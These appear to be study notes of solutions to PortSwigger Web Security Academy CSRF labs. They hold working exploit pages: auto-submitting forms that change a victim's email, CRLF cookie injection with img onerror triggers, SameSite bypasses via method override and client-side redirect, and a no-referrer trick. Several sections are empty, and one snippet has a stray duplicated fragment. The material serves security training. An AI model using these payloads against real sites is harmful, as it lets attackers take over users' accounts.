


## [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

- 
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit(); 
</script>
```


## [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

- If changing request to GET works in burp it is vulnertable to this.
```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit(); 
</script>
```


## [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit(); 
</script>
```


## [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)


```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net"> 
	<input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">	
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```


## [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

- If there is a csrfKey cookie and a csrf parameter are diffrent it is likely vulnerable to this.
```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="hacked@web-security-academy.net"> 
	<input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">	
</form> 

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```



## [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

- If the cookie and the parameter are the same it is vulnerable to this.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker_email@attacker_domain.com">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrf=YOUR-CSRF-TOKEN%3b%20SameSite=None" onerror="document.forms[0].submit()">rms[0].submit()">
```

## [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

```html
<script> 
	document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; 
</script>
```

## [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)


```html
<script> 
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@web-security-academy.net%26submit=1"; 
</script>
```

## [SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

- Need to learn about web sockets first


## [SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)




## [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net"> </form> 
<meta name="referrer" content="no-referrer">	
<script> 
	document.forms[0].submit(); 
</script>
```


## [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)




